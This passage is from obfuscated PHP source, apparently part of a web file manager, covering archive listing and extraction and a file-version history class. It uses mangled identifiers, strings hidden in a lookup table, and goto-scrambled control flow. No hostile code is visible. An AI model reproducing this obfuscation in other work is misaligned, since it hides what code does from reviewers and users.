array_merge($DÔ¿±ÏèÎ, $FÅå•ªİ¥„); goto F…Ô—ÚÉ“; Eô¨‹‰Óİ†: $c”×ÈØÌ· = KodArchive::extract($CÖ¼Ö¼‹Ê, $CÏÆ’»¨Ø . $aÔèËÉàÔƒ[8], $C¹ ½±çùÅ); self::archiveExt(); if (!$c”×ÈØÌ·[$aÔèËÉàÔƒ[1077]]) { show_json($aÔèËÉàÔƒ[1078] . $c”×ÈØÌ·[$aÔèËÉàÔƒ[1079]], !1); } goto c¦à±…×ç; Aá£ñò¨¯: } public static function unzipList($DÑŠÌ»îƒŠ) { goto e’¥·øŸÚò; Dƒ¹¦›ùÙ: $D²ÙáÕ»°ö = self::info($C³‡®¡Ê•×); $eÜÚÒ®ß— = self::fileExt($D²ÙáÕ»°ö); $Fœ–­´Ğ¦Ø = self::tmpFileName($D²ÙáÕ»°ö); goto cÀáÀÚÖé; e´Ÿ°ÃÛ«ö: $c®Ò”¸ÈÇŒ = self::iconvSystem($c®Ò”¸ÈÇŒ); if ($bƒ…‚àç—º >= 0) { $eåÌ˜âÚ = isset($DÑŠÌ»îƒŠ[$a‰ÔÕ¡ØÍ[1085]]) ? $DÑŠÌ»îƒŠ[$a‰ÔÕ¡ØÍ[1085]] : !1; $Fˆ‡ã¤ğª® = isset($DÑŠÌ»îƒŠ[$a‰ÔÕ¡ØÍ[28]]) ? $DÑŠÌ»îƒŠ[$a‰ÔÕ¡ØÍ[28]] : $a‰ÔÕ¡ØÍ[33]; KodArchive::filePreview($c®Ò”¸ÈÇŒ, $bƒ…‚àç—º, $eåÌ˜âÚ, $Fˆ‡ã¤ğª®); self::archiveExt(); die; } $dˆõØ›×Š§ = KodArchive::listContent($c®Ò”¸ÈÇŒ); goto aÍé½Â²ˆ; c¡ëÔ–¦ãÄ: return $dˆõØ›×Š§[$a‰ÔÕ¡ØÍ[1079]]; goto C‰äƒÖ„îŒ; Eï”‘‡”ªÂ: if (!is_dir($a˜¡ ©ĞÚ)) { mk_dir($a˜¡ ©ĞÚ); } $c®Ò”¸ÈÇŒ = $a˜¡ ©ĞÚ . $a‰ÔÕ¡ØÍ[8] . $D™ÚíÖš‰Ğ; if (!@file_exists(self::iconvSystem($c®Ò”¸ÈÇŒ))) { if (isset($D…È¢À·)) { url_request($D±¬¹‹ë¦Ï, $a‰ÔÕ¡ØÍ[1084], $c®Ò”¸ÈÇŒ); } else { $f‹ß•¯•Öç = self::localFilePath($D±¬¹‹ë¦Ï, $eÜÚÒ®ß—); $c®Ò”¸ÈÇŒ = $f‹ß•¯•Öç ? $f‹ß•¯•Öç : self::download($D±¬¹‹ë¦Ï, $c®Ò”¸ÈÇŒ); } } goto e´Ÿ°ÃÛ«ö; f·¸†éŠ¨: $a¡×ø…øÇ† = json_encode($dˆõØ›×Š§[$a‰ÔÕ¡ØÍ[1079]]); self::setContent($DÍğšô„òè, $a¡×ø…øÇ†); if (count($dˆõØ›×Š§[$a‰ÔÕ¡ØÍ[1079]]) >= $b«¸ì“‹”) { show_json(sprintf(LNG($a‰ÔÕ¡ØÍ[1083]), count($dˆõØ›×Š§[$a‰ÔÕ¡ØÍ[1079]])), !1); } goto c¡ëÔ–¦ãÄ; e’¥·øŸÚò: $a‰ÔÕ¡ØÍ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D±¬¹‹ë¦Ï = $DÑŠÌ»îƒŠ[$a‰ÔÕ¡ØÍ[76]]; $bƒ…‚àç—º = isset($DÑŠÌ»îƒŠ[$a‰ÔÕ¡ØÍ[1081]]) ? $DÑŠÌ»îƒŠ[$a‰ÔÕ¡ØÍ[1081]] : -1; goto Bêœ†±æŸ…; cÀáÀÚÖé: if (isset($D…È¢À·)) { $F‘ìé¤‘Î = array($D…È¢À·[$a‰ÔÕ¡ØÍ[76]], $D…È¢À·[$a‰ÔÕ¡ØÍ[1081]], $D…È¢À·[$a‰ÔÕ¡ØÍ[28]]); $D™ÚíÖš‰Ğ = md5(implode($a‰ÔÕ¡ØÍ[71], $F‘ìé¤‘Î)) . $a‰ÔÕ¡ØÍ[95] . get_path_ext($D…È¢À·[$a‰ÔÕ¡ØÍ[28]]); } else { $F‘ìé¤‘Î = array($D²ÙáÕ»°ö[$a‰ÔÕ¡ØÍ[28]], $D²ÙáÕ»°ö[$a‰ÔÕ¡ØÍ[76]], $D²ÙáÕ»°ö[$a‰ÔÕ¡ØÍ[78]]); $D™ÚíÖš‰Ğ = md5(implode($a‰ÔÕ¡ØÍ[71], $F‘ìé¤‘Î)) . $a‰ÔÕ¡ØÍ[95] . $eÜÚÒ®ß—; } if ($bƒ…‚àç—º == -1) { $DÍğšô„òè = IO_PATH_SYSTEM_TEMP . "\172\151\x70\x56\151\145\x77\x2f{$Fœ–­´Ğ¦Ø}\57{$D™ÚíÖš‰Ğ}\x2e\x6c\157\147"; $eÍù‚Šçò = self::infoFull($DÍğšô„òè); if ($eÍù‚Šçò) { $DÍğšô„òè = $eÍù‚Šçò[$a‰ÔÕ¡ØÍ[76]]; $E É±¼Ö¼í = self::getContent($DÍğšô„òè); if ($E É±¼Ö¼í) { $a¡×ø…øÇ† = json_decode($E É±¼Ö¼í, !0); if (count($a¡×ø…øÇ†) >= $b«¸ì“‹”) { show_json(sprintf(LNG($a‰ÔÕ¡ØÍ[1083]), count($a¡×ø…øÇ†)), !1); } return $a¡×ø…øÇ†; } } else { $DÍğšô„òè = self::mkfile($DÍğšô„òè); } } $a˜¡ ©ĞÚ = TEMP_FILES . $Fœ–­´Ğ¦Ø; goto Eï”‘‡”ªÂ; Bêœ†±æŸ…: $b«¸ì“‹” = 50000; if (request_url_safe($D±¬¹‹ë¦Ï)) { $D…È¢À· = parse_url_query($D±¬¹‹ë¦Ï); if (!isset($D…È¢À·[$a‰ÔÕ¡ØÍ[76]])) { show_json($a‰ÔÕ¡ØÍ[1082], !1); } } $C³‡®¡Ê•× = isset($D…È¢À·) ? $D…È¢À·[$a‰ÔÕ¡ØÍ[76]] : $D±¬¹‹ë¦Ï; goto Dƒ¹¦›ùÙ; aÍé½Â²ˆ: self::archiveExt(); del_dir($a˜¡ ©ĞÚ); if (!$dˆõØ›×Š§[$a‰ÔÕ¡ØÍ[1077]]) { show_json($dˆõØ›×Š§[$a‰ÔÕ¡ØÍ[1079]], !1); } goto f·¸†éŠ¨; C‰äƒÖ„îŒ: } private static function fileExt($D¶²†Ëê³£) { $D Ì¡‹Ïõ¸ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eÎ†ø²á… = $D¶²†Ëê³£[$D Ì¡‹Ïõ¸[168]]; if ($eÎ†ø²á… == $D Ì¡‹Ïõ¸[1086]) { $CÊçßØ½‘ = $D Ì¡‹Ïõ¸[1087]; if (substr($D¶²†Ëê³£[$D Ì¡‹Ïõ¸[28]], -strlen($CÊçßØ½‘)) == $CÊçßØ½‘) { $eÎ†ø²á… = $D Ì¡‹Ïõ¸[1088]; } } self::archiveExt($eÎ†ø²á…); return $eÎ†ø²á…; } private static function zipFileList($D§…¨—Æš¨, $Aó¿ô«±îÏ = false) { $aùÕ¦«†‰ =& $_SERVER[ÒÆ›ÆØÎ¾]; $cÚ’•¦§ Í = array(); foreach ($D§…¨—Æš¨ as $A¯‚çÏÍ½) { $eŸ…·‹’ò³ = $A¯‚çÏÍ½[$aùÕ¦«†‰[76]]; if ($Aó¿ô«±îÏ) { $eŸ…·‹’ò³ = self::copy($A¯‚çÏÍ½[$aùÕ¦«†‰[76]], $Aó¿ô«±îÏ, $aùÕ¦«†‰[775]); } else { $FƒÜ¼‹·•é = self::init($A¯‚çÏÍ½[$aùÕ¦«†‰[76]]); if ($FƒÜ¼‹·•é->getType() == $aùÕ¦«†‰[106]) { $eŸ…·‹’ò³ = $FƒÜ¼‹·•é->path; } } if ($eŸ…·‹’ò³ && self::local()->exist($eŸ…·‹’ò³)) { $cÚ’•¦§ Í[$A¯‚çÏÍ½[$aùÕ¦«†‰[76]]] = $eŸ…·‹’ò³; } } if (!empty($cÚ’•¦§ Í)) { return array_values($cÚ’•¦§ Í); } show_json(LNG($aùÕ¦«†‰[1052]), !1); } public static function tmpFileName($CÑ¢¯™“åˆ) { $a§Ò“Å²¯ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aô¥õÜğŒ¡ = array($CÑ¢¯™“åˆ[$a§Ò“Å²¯[28]], $CÑ¢¯™“åˆ[$a§Ò“Å²¯[76]], $CÑ¢¯™“åˆ[$a§Ò“Å²¯[78]], $CÑ¢¯™“åˆ[$a§Ò“Å²¯[487]]); return md5(implode($a§Ò“Å²¯[71], $aô¥õÜğŒ¡)); } private static function localFilePath($e¢Èê‹£‰, $FÖ‹‹îöÑâ) { goto fÜÚ•ÖêÈ‘; fÜÚ•ÖêÈ‘: $E¡«Çä…±’ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($FÖ‹‹îöÑâ == $E¡«Çä…±’[1089] && strtoupper(substr(PHP_OS, 0, 3)) == $E¡«Çä…±’[1090]) { return !1; } $a‚–°î— = KodIO::parse($e¢Èê‹£‰); goto a“ÅÀ×±Ú; a“ÅÀ×±Ú: if ($a‚–°î—[$E¡«Çä…±’[29]] == KodIO::KOD_SOURCE) { $f·¢¸šé¡¯ = Model($E¡«Çä…±’[782])->fileInfoGet(KodIO::sourceID($e¢Èê‹£‰)); if (!$f·¢¸šé¡¯[$E¡«Çä…±’[76]]) { show_json($E¡«Çä…±’[1091], !1); } $e¢Èê‹£‰ = $f·¢¸šé¡¯[$E¡«Çä…±’[76]]; } $aÏòÄØÁîŠ = self::init($e¢Èê‹£‰); $bùæ¬ÉŸ¹ = $aÏòÄØÁîŠ->getType(); goto B†ÓğˆŠÅ®; B†ÓğˆŠÅ®: if ($bùæ¬ÉŸ¹ == $E¡«Çä…±’[106] || $bùæ¬ÉŸ¹ == $E¡«Çä…±’[1092]) { if (!$aÏòÄØÁîŠ->exist($aÏòÄØÁîŠ->path)) { show_json(LNG($E¡«Çä…±’[105]), !1); } return $aÏòÄØÁîŠ->path; } return !1; goto bÒ™Ó¦¬æ¢; bÒ™Ó¦¬æ¢: } private static function archiveExt($b£ÈÜ—šÌø = '') { $GLOBALS[$_SERVER[ÒÆ›ÆØÎ¾][1093]] = $b£ÈÜ—šÌø; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto fÔ³„µ£¢¦; A„—¿‘ïËé: Hook::bind($D¡¤»Œ‰–œ[1105], $D¡¤»Œ‰–œ[1106]); Hook::bind($D¡¤»Œ‰–œ[1107], $D¡¤»Œ‰–œ[1108]); goto eÎ…İ„ïß; bš˜Ó¼•Öø: Hook::bind($D¡¤»Œ‰–œ[1099], $D¡¤»Œ‰–œ[1100]); Hook::bind($D¡¤»Œ‰–œ[1101], $D¡¤»Œ‰–œ[1102]); Hook::bind($D¡¤»Œ‰–œ[1103], $D¡¤»Œ‰–œ[1104]); goto A„—¿‘ïËé; fÔ³„µ£¢¦: $D¡¤»Œ‰–œ =& $_SERVER[ÒÆ›ÆØÎ¾]; $a‚¨çòÇ‰Ï = $GLOBALS[$D¡¤»Œ‰–œ[6]][$D¡¤»Œ‰–œ[88]]; if ($a‚¨çòÇ‰Ï[$D¡¤»Œ‰–œ[1094]] != 1) { return; } goto E¢î¶É´®; E¢î¶É´®: if ($a‚¨çòÇ‰Ï[$D¡¤»Œ‰–œ[1095]] <= 0) { return; } if (isset($_REQUEST[$D¡¤»Œ‰–œ[1096]]) && $_REQUEST[$D¡¤»Œ‰–œ[1096]] == $D¡¤»Œ‰–œ[87]) { return; } Hook::bind($D¡¤»Œ‰–œ[1097], $D¡¤»Œ‰–œ[1098]); goto bš˜Ó¼•Öø; eÎ…İ„ïß: } public static function eventBeforeUpload($Eš‹«õ½ìå) { if ($Eš‹«õ½ìå[3] && $Eš‹«õ½ìå[3] != REPEAT_REPLACE) { return; } $a‚ÏÇŒÉªˆ = self::parsePath($Eš‹«õ½ìå[0]); if (!$a‚ÏÇŒÉªˆ) { return; } self::add($a‚ÏÇŒÉªˆ); } public static function eventBeforeEdit($C¯òËî¡) { $Bº´ÃÈƒé = self::parsePath($C¯òËî¡[0]); if (!$Bº´ÃÈƒé) { return; } self::add($Bº´ÃÈƒé); } public static function eventBeforeCopyFile($FÈòíÓ¥’, $c±ö—Ø‡Î, $eÙÓô¨œ¤Ò, $Cõ‘ù…”ğç, $e¡‹¬à«¤‘, $FÈĞÌ™Ï„ê) { $FäÈªÛ˜÷Ê = $eÙÓô¨œ¤Ò->getPathOuter($Cõ‘ù…”ğç); $dëõ„İªÂĞ = self::parsePath($FäÈªÛ˜÷Ê); if (!$dëõ„İªÂĞ) { return; } self::add($dëõ„İªÂĞ); } public static function eventBeforeRename($FÆ«‰’Ò ß) { $cÓ²ƒï¯³ =& $_SERVER[ÒÆ›ÆØÎ¾]; $a…™ï‡“­“ = self::parsePath($FÆ«‰’Ò ß[0]); if (!$a…™ï‡“­“) { return; } $f”õõØÌ÷ˆ = self::checkInHistory($a…™ï‡“­“); if (!$f”õõØÌ÷ˆ) { return; } if ($f”õõØÌ÷ˆ[$cÓ²ƒï¯³[29]] == $cÓ²ƒï¯³[193]) { $e˜Ì¸¤ä¡æ = self::listData($a…™ï‡“­“); if ($e˜Ì¸¤ä¡æ && $e˜Ì¸¤ä¡æ[$cÓ²ƒï¯³[367]]) { self::moveHistory($a…™ï‡“­“, $FÆ«‰’Ò ß[1]); } } else { IO::rename($f”õõØÌ÷ˆ[$cÓ²ƒï¯³[76]], $FÆ«‰’Ò ß[1]); } } public static function eventBeforeMove($B•ï–Ï§ƒå) { goto eèœƒ’îãì; aäœç¸İ: $AØØïåÔƒÊ = self::parsePath($B•ï–Ï§ƒå[1]); if (!$AØØïåÔƒÊ) { return; } $CÜøùøÑòÁ = $B•ï–Ï§ƒå[3]; goto aù«‘ºÙ÷; eèœƒ’îãì: $dÚˆÉ =& $_SERVER[ÒÆ›ÆØÎ¾]; $c‚ãˆ˜„”‹ = self::parsePath($B•ï–Ï§ƒå[0]); if (!$c‚ãˆ˜„”‹) { return; } goto aäœç¸İ; D¸ËÆ±Ñ×“: if ($BÖÏœÂôˆğ[$dÚˆÉ[29]] == $dÚˆÉ[193]) { $bË¡“Ø¬‡° = self::listData($c‚ãˆ˜„”‹); $D©è”±¬ªã = rtrim($AØØïåÔƒÊ, $dÚˆÉ[8]) . $dÚˆÉ[8] . ($CÜøùøÑòÁ ? $CÜøùøÑòÁ : get_path_this($c‚ãˆ˜„”‹)); $AÅÜ†°ƒ’Í = self::listData($D©è”±¬ªã); if ($bË¡“Ø¬‡° && $bË¡“Ø¬‡°[$dÚˆÉ[367]] && $AÅÜ†°ƒ’Í && $AÅÜ†°ƒ’Í[$dÚˆÉ[367]]) { return self::clear($c‚ãˆ˜„”‹); } if ($bË¡“Ø¬‡° && $bË¡“Ø¬‡°[$dÚˆÉ[367]]) { self::moveHistory($c‚ãˆ˜„”‹, $CÜøùøÑòÁ, $a·‹°Ü£„„); } } else { IO::move($BÖÏœÂôˆğ[$dÚˆÉ[76]], $a·‹°Ü£„„, !1, $CÜøùøÑòÁ); self::clearEmptyFolder(IO::pathFather($BÖÏœÂôˆğ[$dÚˆÉ[76]])); } goto b—˜ƒ£ğ»´; aù«‘ºÙ÷: $BÖÏœÂôˆğ = self::checkInHistory($c‚ãˆ˜„”‹); if (!$BÖÏœÂôˆğ) { return; } $a·‹°Ü£„„ = self::pathHistory($AØØïåÔƒÊ); goto D¸ËÆ±Ñ×“; b—˜ƒ£ğ»´: } public static function eventAfterRemove($e Á¶ù¾¦Ê, $dŒæÚ†ôà‡) { goto bÖë™ï²Âš; B‰×Óô´ø¿: if ($EÉŠÔ‹ª»ã[$dĞ‹ºÆÈ’ƒ[29]] == $dĞ‹ºÆÈ’ƒ[193]) { $FÊÃ©…«Á¼ = self::listData($BŒğÁ‘ˆŠ¸, !1); if ($FÊÃ©…«Á¼ && $FÊÃ©…«Á¼[$dĞ‹ºÆÈ’ƒ[367]]) { self::clear($BŒğÁ‘ˆŠ¸, !1); } } else { IO::remove($EÉŠÔ‹ª»ã[$dĞ‹ºÆÈ’ƒ[76]]); self::clearEmptyFolder(IO::pathFather($EÉŠÔ‹ª»ã[$dĞ‹ºÆÈ’ƒ[76]])); } goto b§†Âäöèí; d°–Ê¹£ÈÄ: if (!$BŒğÁ‘ˆŠ¸) { return; } $EÉŠÔ‹ª»ã = self::checkInHistory($BŒğÁ‘ˆŠ¸); if (!$EÉŠÔ‹ª»ã) { return; } goto B‰×Óô´ø¿; bÖë™ï²Âš: $dĞ‹ºÆÈ’ƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$dŒæÚ†ôà‡) { return; } $BŒğÁ‘ˆŠ¸ = self::parsePath($e Á¶ù¾¦Ê[0]); goto d°–Ê¹£ÈÄ; b§†Âäöèí: } private static function checkInHistory($Fø‚Ø„­) { $döµ¹¯İÒ = self::pathHistory($Fø‚Ø„­); if (!IO::exist($döµ¹¯İÒ)) { $döµ¹¯İÒ .= $_SERVER[ÒÆ›ÆØÎ¾][1109]; } return IO::exist($döµ¹¯İÒ) ? IO::info($döµ¹¯İÒ) : !1; } private static function parsePath($F„‡™ï¸‚) { goto e¡…ˆ¤Æô“; e¡…ˆ¤Æô“: $D–®²±Œô‘ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$F„‡™ï¸‚) { return !1; } if ($GLOBALS[$D–®²±Œô‘[1110]]) { return; } goto Fæ“–ÌÉßƒ; E’ º±°Êê: $C‰¬Ó·‰Ú = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $D–®²±Œô‘[1112]); foreach ($C‰¬Ó·‰Ú as $cÇ°¿“¬£ª) { if (!$d«•Å†ØŸŞ && substr($F„‡™ï¸‚, 0, strlen($cÇ°¿“¬£ª)) == $cÇ°¿“¬£ª) { return !1; } } self::log($GLOBALS[$D–®²±Œô‘[1034]] . $D–®²±Œô‘[1113] . $F„‡™ï¸‚); goto aÚ‡ñ»ñİº; eÄéáÎÇÏ: if (!$c²ŸÒ¤‡ó || !$Dó­ Ü÷–·[$D–®²±Œô‘[1111]]) { return !1; } if ($d«•Å†ØŸŞ == KodIO::KOD_SHARE_ITEM) { $dóÚÆœ¸ç¶ = IO::init($F„‡™ï¸‚); if ($dóÚÆœ¸ç¶->pathParse[$D–®²±Œô‘[1039]]) { return self::parsePath($dóÚÆœ¸ç¶->pathParse[$D–®²±Œô‘[1039]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto E’ º±°Êê; Fæ“–ÌÉßƒ: $Dó­ Ü÷–· = KodIO::parse($F„‡™ï¸‚); $d«•Å†ØŸŞ = $Dó­ Ü÷–·[$D–®²±Œô‘[29]]; $c²ŸÒ¤‡ó = !$d«•Å†ØŸŞ || $d«•Å†ØŸŞ == KodIO::KOD_IO || $d«•Å†ØŸŞ == KodIO::KOD_SHARE_ITEM; goto eÄéáÎÇÏ; aÚ‡ñ»ñİº: return $F„‡™ï¸‚; goto bÖ©½Ûíß¿; bÖ©½Ûíß¿: } private static function pathHistory($BÙËŒ˜¶Ô) { $C¼Üê ³ĞÚ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D¥Œ¡«»âê = self::$_historyBase . ltrim(KodIO::clear($BÙËŒ˜¶Ô), $C¼Üê ³ĞÚ[8]); $D¥Œ¡«»âê = str_replace(array($C¼Üê ³ĞÚ[1114]), array($C¼Üê ³ĞÚ[1115]), $D¥Œ¡«»âê); return $D¥Œ¡«»âê; } public static function log($A‘àà¡²õ) { } public static function historyCount($AĞ¹ãÇè‡õ) { $d„ãß®ĞÚ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fêóÒª«Áî = array(); $C¾Ã¥¬¦ŞË = array(); foreach ($AĞ¹ãÇè‡õ as $AîÖ¦Í²½Á) { $cÒ±èšîÕæ = get_path_father($AîÖ¦Í²½Á); if (!$C¾Ã¥¬¦ŞË[$cÒ±èšîÕæ]) { $C¾Ã¥¬¦ŞË[$cÒ±èšîÕæ] = array(); } $C¾Ã¥¬¦ŞË[$cÒ±èšîÕæ][] = get_path_this($AîÖ¦Í²½Á); } foreach ($C¾Ã¥¬¦ŞË as $cÒ±èšîÕæ => $cĞöÇÚÏø) { $DÚçÁÄ½¤Â = self::parsePath($cÒ±èšîÕæ); if (!$DÚçÁÄ½¤Â) { continue; } foreach ($cĞöÇÚÏø as $FÆ¨“óÊÏ) { $C˜ŸÍòàÀ¿ = self::listData(rtrim($DÚçÁÄ½¤Â, $d„ãß®ĞÚ[8]) . $d„ãß®ĞÚ[8] . $FÆ¨“óÊÏ, !1); if ($C˜ŸÍòàÀ¿ && $C˜ŸÍòàÀ¿[$d„ãß®ĞÚ[367]]) { $fêóÒª«Áî[rtrim($cÒ±èšîÕæ, $d„ãß®ĞÚ[8]) . $d„ãß®ĞÚ[8] . $FÆ¨“óÊÏ] = count($C˜ŸÍòàÀ¿[$d„ãß®ĞÚ[367]]); } } } return $fêóÒª«Áî; } public static function add($Aó‘³Ïá») { goto cØ‚¯¥½¼ö; C¼¹Ñ¯–Ÿˆ: $eøùè†Ò½– = $DŸÖ…ÙËÔÚ[$c†åÅêâîÒ[367]]; if ($c‘ì¬¬Ë”´[$c†åÅêâîÒ[78]] == 0) { return; } if ($c‘ì¬¬Ë”´[$c†åÅêâîÒ[78]] >= 1024 * 1024 * 500) { return !1; } goto fì¿ô²âÓõ; cØ‚¯¥½¼ö: $c†åÅêâîÒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $DŸÖ…ÙËÔÚ = self::listData($Aó‘³Ïá»); if (!$DŸÖ…ÙËÔÚ) { return; } goto dè½¿ä¾Ü; eÀ¡’ŠØ¶µ: $bé²ªœÕ½ = array($c†åÅêâîÒ[393] => $B»½—Ôî…Î, $c†åÅêâîÒ[171] => $EĞòŒš‰Éô, $c†åÅêâîÒ[28] => $c‘ì¬¬Ë”´[$c†åÅêâîÒ[28]] . $c†åÅêâîÒ[95] . date($c†åÅêâîÒ[1118]) . rand_string(1), $c†åÅêâîÒ[78] => $c‘ì¬¬Ë”´[$c†åÅêâîÒ[78]], $c†åÅêâîÒ[432] => USER_ID, $c†åÅêâîÒ[194] => time(), $c†åÅêâîÒ[1119] => $c†åÅêâîÒ[33]); IO::mkdir($DŸÖ…ÙËÔÚ[$c†åÅêâîÒ[1120]]); $AÊ”§Ååµ¨ = IO::copy($Aó‘³Ïá», $DŸÖ…ÙËÔÚ[$c†åÅêâîÒ[1120]], !1, $bé²ªœÕ½[$c†åÅêâîÒ[28]]); goto bÕ­‚ˆ¡×ù; c¬ÑÜ«Öô: if ($D¬ó¿æ’¹¶ <= 0) { return; } $EĞòŒš‰Éô = IO::hashSimple($Aó‘³Ïá»); $c‘ì¬¬Ë”´ = IO::info($Aó‘³Ïá»); goto C¼¹Ñ¯–Ÿˆ; fì¿ô²âÓõ: if ($eøùè†Ò½– && $eøùè†Ò½–[0][$c†åÅêâîÒ[171]] == $EĞòŒš‰Éô) { return !0; } if (array_key_exists($c†åÅêâîÒ[196], $c‘ì¬¬Ë”´) && !$c‘ì¬¬Ë”´[$c†åÅêâîÒ[196]]) { return !1; } $B»½—Ôî…Î = short_id(time()); goto eÀ¡’ŠØ¶µ; bÕ­‚ˆ¡×ù: if (!$AÊ”§Ååµ¨) { self::clearEmptyFolder($DŸÖ…ÙËÔÚ[$c†åÅêâîÒ[1120]]); return !1; } array_unshift($eøùè†Ò½–, $bé²ªœÕ½); if (count($eøùè†Ò½–) > $dÙ“ÙˆãŠÏ) { $c¡¤§Óƒ¥· = array_slice($eøùè†Ò½–, $dÙ“ÙˆãŠÏ); foreach ($c¡¤§Óƒ¥· as $eÖÅ—ƒ††) { IO::remove($DŸÖ…ÙËÔÚ[$c†åÅêâîÒ[1120]] . $eÖÅ—ƒ††[$c†åÅêâîÒ[28]]); } $eøùè†Ò½– = array_slice($eøùè†Ò½–, 0, $dÙ“ÙˆãŠÏ); } goto C¡¹¬ùìé; C¡¹¬ùìé: return self::saveData($DŸÖ…ÙËÔÚ[$c†åÅêâîÒ[1121]], $eøùè†Ò½–); goto B ¬ï¶ƒİ¨; dè½¿ä¾Ü: $BÆ‹²•ÅØ = Model($c†åÅêâîÒ[722])->get($c†åÅêâîÒ[1116]); $D¬ó¿æ’¹¶ = $GLOBALS[$c†åÅêâîÒ[6]][$c†åÅêâîÒ[88]][$c†åÅêâîÒ[1095]]; $dÙ“ÙˆãŠÏ = $BÆ‹²•ÅØ == $c†åÅêâîÒ[1117] ? 5 : $D¬ó¿æ’¹¶; goto c¬ÑÜ«Öô; B ¬ï¶ƒİ¨: } public static function remove($dÀ¡ŠÑ†ôë, $c©¥ÂÌÛ™) { $cºÛ‹‹‚²¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; $AÀßš‘³ê· = self::listData($dÀ¡ŠÑ†ôë); $cåÁµì’ô® = array(); if (!$AÀßš‘³ê·) { return !1; } foreach ($AÀßš‘³ê·[$cºÛ‹‹‚²¦[367]] as $c†âø§×î) { if ($c†âø§×î[$cºÛ‹‹‚²¦[393]] == $c©¥ÂÌÛ™) { IO::remove($AÀßš‘³ê·[$cºÛ‹‹‚²¦[1120]] . $c†âø§×î[$cºÛ‹‹‚²¦[28]]); continue; } $cåÁµì’ô®[] = $c†âø§×î; } return self::saveData($AÀßš‘³ê·[$cºÛ‹‹‚²¦[1121]], $cåÁµì’ô®); } public static function clear($DÓ¤¸ÌÇØ¯, $D• †Ã“„Û = true) { $B£Ù ­Ç“ =& $_SERVER[ÒÆ›ÆØÎ¾]; $dĞ‡“ÌÄ’ = self::listData($DÓ¤¸ÌÇØ¯, $D• †Ã“„Û); if (!$dĞ‡“ÌÄ’) { return !1; } foreach ($dĞ‡“ÌÄ’[$B£Ù ­Ç“[367]] as $c¦§Ó¥ ¼Î) { IO::remove($dĞ‡“ÌÄ’[$B£Ù ­Ç“[1120]] . $c¦§Ó¥ ¼Î[$B£Ù ­Ç“[28]]); } return self::saveData($dĞ‡“ÌÄ’[$B£Ù ­Ç“[1121]], array()); } public static function moveHistory($FèÏÇñ‹, $E¾’‡Ø†…² = '', $cøĞè‰ßãÀ = '') { goto B…ˆ¾Ìº¿Í; fÍª•ğºˆ¨: $A†ƒ“³»ô = $c§¾ˆä¡¼î[1109]; $E¾’‡Ø†…² = $E¾’‡Ø†…² ? $E¾’‡Ø†…² : get_path_this($FèÏÇñ‹); $cøĞè‰ßãÀ = $cøĞè‰ßãÀ ? $cøĞè‰ßãÀ : $b­õ«ßĞ[$c§¾ˆä¡¼î[1120]]; goto fİÊóŠäï; B…ˆ¾Ìº¿Í: $c§¾ˆä¡¼î =& $_SERVER[ÒÆ›ÆØÎ¾]; $b­õ«ßĞ = self::listData($FèÏÇñ‹, !1); if (!$b­õ«ßĞ || !$b­õ«ßĞ[$c§¾ˆä¡¼î[367]]) { return !1; } goto fÍª•ğºˆ¨; fİÊóŠäï: $D¼Ğšßì = substr(get_path_this($b­õ«ßĞ[$c§¾ˆä¡¼î[1121]]), 0, -strlen($A†ƒ“³»ô)); foreach ($b­õ«ßĞ[$c§¾ˆä¡¼î[367]] as $eòÜÂ†¥İí => $fîŒßØ°Ã×) { $e”£¦İŒÜŒ = $E¾’‡Ø†…² . substr($fîŒßØ°Ã×[$c§¾ˆä¡¼î[28]], strlen($D¼Ğšßì)); $d¢œùÕŒ¿â = IO::move($b­õ«ßĞ[$c§¾ˆä¡¼î[1120]] . $fîŒßØ°Ã×[$c§¾ˆä¡¼î[28]], $cøĞè‰ßãÀ, !1, $e”£¦İŒÜŒ); if ($d¢œùÕŒ¿â) { $b­õ«ßĞ[$c§¾ˆä¡¼î[367]][$eòÜÂ†¥İí][$c§¾ˆä¡¼î[28]] = $e”£¦İŒÜŒ; } } $b­õ«ßĞ[$c§¾ˆä¡¼î[1121]] = IO::move($b­õ«ßĞ[$c§¾ˆä¡¼î[1121]], $cøĞè‰ßãÀ, !1, $E¾’‡Ø†…² . $A†ƒ“³»ô); goto a›‘É§Ğ‘; a›‘É§Ğ‘: self::saveData($b­õ«ßĞ[$c§¾ˆä¡¼î[1121]], $b­õ«ßĞ[$c§¾ˆä¡¼î[367]]); self::clearEmptyFolder($b­õ«ßĞ[$c§¾ˆä¡¼î[1120]]); goto f‰…èõ®´¡; f‰…èõ®´¡: } public static function rollback($Cëğ‘—šÉ–, $d­Ö˜«ŠŒ’) { $cÙÜŸàÄ–Ä =& $_SERVER[ÒÆ›ÆØÎ¾]; $fâ¹…É¢ØÑ = self::listData($Cëğ‘—šÉ–); if (!$fâ¹…É¢ØÑ) { return; } $a‰Ãô…èÇÅ = IO::info($Cëğ‘—šÉ–); foreach ($fâ¹…É¢ØÑ[$cÙÜŸàÄ–Ä[367]] as $B·İŸ÷ŠÕ© => $cÚ³‰¯ß×) { if ($cÚ³‰¯ß×[$cÙÜŸàÄ–Ä[393]] == $d­Ö˜«ŠŒ’) { self::add($Cëğ‘—šÉ–); $câ÷Ğòµ—í = $fâ¹…É¢ØÑ[$cÙÜŸàÄ–Ä[1120]] . $cÚ³‰¯ß×[$cÙÜŸàÄ–Ä[28]]; $f²’„‹öŠ = IO::copy($câ÷Ğòµ—í, IO::pathFather($Cëğ‘—šÉ–), REPEAT_REPLACE, $a‰Ãô…èÇÅ[$cÙÜŸàÄ–Ä[28]]); if ($f²’„‹öŠ) { self::remove($Cëğ‘—šÉ–, $d­Ö˜«ŠŒ’); } return $f²’„‹öŠ; } } return !1; } public static function setDetail($B†ÚéõÙê©, $a¸©®ÒïŒ, $d…§Ú…Öëç) { $dÕÑåà‰Ö¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; $E¹îÑîå = self::listData($B†ÚéõÙê©); if 